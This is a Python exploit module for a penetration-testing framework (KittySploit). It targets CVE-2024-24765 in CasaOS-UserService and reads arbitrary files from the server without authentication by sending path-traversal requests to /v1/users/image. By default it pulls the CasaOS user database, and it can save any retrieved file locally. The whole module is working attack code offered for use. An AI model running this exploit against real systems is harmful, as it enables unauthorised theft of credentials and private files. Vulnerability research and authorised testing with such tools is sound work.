#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CasaOS arbitrary file read via /v1/users/image (CVE-2024-24765)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'CasaOS - Arbitrary File Read via users/image (CVE-2024-24765)',
        'description': (
            'Reads arbitrary files through CasaOS-UserService /v1/users/image?path= '
            '(CVE-2024-24765, fixed in 0.4.7). Does not open a shell session.'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2024-24765'],
        'platform': Platform.LINUX,
        'references': [
            'https://github.com/IceWhaleTech/CasaOS-UserService/security/advisories/GHSA-h5gf-cmm8-cg7c',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-24765',
        ],
        'tags': ['casaos', 'icewhale', 'lfi', 'file-read', 'unauth', 'cve-2024-24765'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'cost': 1.2,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2024_24765_detect'],
            },
        },
    }

    file_read = OptString(
        '/var/lib/casaos/db/user.db',
        'Absolute remote file path to read',
        required=True,
    )
    output_file = OptString('', 'Local file to write retrieved content', required=False)
    output_limit = OptInteger(
        12000,
        'Max chars to print when output_file empty (0=full)',
        required=False,
        advanced=True,
    )

    def execute(self, file_path: str) -> bytes:
        remote = str(file_path or '').strip()
        if not remote:
            return b''
        candidates = [remote]
        # GHSA PoC style: escape from /var/lib/casaos/conf/
        if remote.startswith('/var/lib/casaos/'):
            rel = remote[len('/var/lib/casaos/'):]
            candidates.append(f'/var/lib/casaos/conf/../{rel}')
        for probe in candidates:
            path = f'/v1/users/image?path={probe}'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and r.status_code == 200 and (r.content or b''):
                return r.content
        return b''

    def run(self):
        target = str(self.file_read or '').strip()
        print_status(f'Reading {target} via /v1/users/image ...')
        data = self.execute(target)
        if not data:
            print_error('Empty response / file not readable')
            return False
        text = data.decode('utf-8', errors='replace')
        if target.endswith('passwd') and not re.search(r'root:.*:0:0:', text):
            print_warning('Response does not look like /etc/passwd')
        out = str(self.output_file or '').strip()
        if out:
            with open(out, 'wb') as fh:
                fh.write(data)
            print_success(f'Wrote {len(data)} bytes to {out}')
        else:
            limit = int(self.output_limit or 0)
            print_info(text if limit <= 0 else text[:limit])
        return True
